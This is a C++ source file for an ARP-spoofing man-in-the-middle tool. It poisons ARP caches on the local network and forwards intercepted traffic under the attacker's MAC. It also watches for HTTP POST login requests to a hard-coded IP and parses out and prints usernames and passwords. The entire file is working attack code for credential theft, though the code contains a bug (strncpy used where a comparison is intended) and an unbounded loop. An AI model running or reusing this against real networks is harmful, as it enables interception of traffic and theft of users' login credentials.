#include "Net.h"

using namespace std;

int main(int argc, char** argv){
    timeval arp_period { .tv_sec = 0, .tv_usec = 10000 }, start, now;
    if (gettimeofday(&start, NULL) < 0){
        perror("gettimeofday() failed");
        exit(EXIT_FAILURE);
    }
    Net* net = new Net((argc < 2) ? "" : argv[1]);
    net->get_net_mac();
    net->print_net_mac();
    net->arp_spoofing();

    uint32_t target_ip = (163 << 24) + (182 << 16) + (194 << 8) + 25;
    string target_request = "POST /login/login_results.asp";

    while (true) {
        tcp_packet buf;
        memset(&buf, 0, sizeof(buf));
        int len = recvfrom(net->get_recv_sock(), &buf, ETH_FRAME_LEN, 0, NULL, NULL);
        if (len > 0 && buf.ip_hdr.version == 0x4 && buf.ip_hdr.ihl == 0x5) {
            uint32_t ip_addr = ntohl(buf.ip_hdr.daddr);
            if (ip_addr != net->get_ip()) {
//cout << dec << (ip_addr >> 24) << "." << ((ip_addr >> 16) & 255) << "." << ((ip_addr >> 8) & 255) << "." << (ip_addr & 255) << endl;
                map<uint32_t, uint8_t*> *arp_table = net->get_arp_table();
                // Modify the destination MAC to the right value according to the destination IP
                if (arp_table->find(ip_addr) == arp_table->end()) memcpy(buf.eth_hdr.ether_dhost, (*arp_table)[net->get_gateway()], 6);
                else memcpy(buf.eth_hdr.ether_dhost, (*arp_table)[ip_addr], 6); // If the destination IP is not in the ARP table, send it to the default gateway
                memcpy(buf.eth_hdr.ether_shost, net->get_mac(), 6); // Modify the source MAC to the attacker's
                if (sendto(net->get_send_sock(), &buf, len, 0, (sockaddr*)net->get_arp_addr(), sizeof(*(net->get_arp_addr()))) < 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
        }
        
        int payload_len;
        if (ntohl(buf.ip_hdr.daddr) == target_ip && !strncpy(buf.data, target_request.c_str(), target_request.length())) { // Found the packet that contains username/password
            // Get the payload length
            for (int i = 0; ; i++) {
                if (buf.data[i] == '\r' && buf.data[i+1] == '\n') {
                    if (sscanf(&buf.data[i+2], "Content-Length: %d\r\n", &payload_len)) break;
                }
            }
            // Get username/password
            char username[256], password[256];
            if(sscanf(&buf.data[len - ETH_HDR_LEN - IPV4_HDR_LEN - TCP_HDR_LEN - payload_len], "txtUser=%s&txtPassword=%s", username, password)) 
                cout << "Username: " << username << endl << "Password: " << password << endl;
        }

        // Periodically get all the IPs in use and do ARP spoofing (must be done frequently enough or the gateway entry will be update)
        if (gettimeofday(&now, NULL) < 0){
            perror("gettimeofday() failed");
            exit(EXIT_FAILURE);
        }
        if ((now.tv_sec > start.tv_sec + arp_period.tv_sec) || ((now.tv_sec == start.tv_sec + arp_period.tv_sec) && (now.tv_usec > start.tv_usec + arp_period.tv_usec))) {
            if (gettimeofday(&start, NULL) < 0){
                perror("gettimeofday() failed");
                exit(EXIT_FAILURE);
            }
            // net->get_net_mac();
            net->arp_spoofing();
        }
    }
    return 0;
}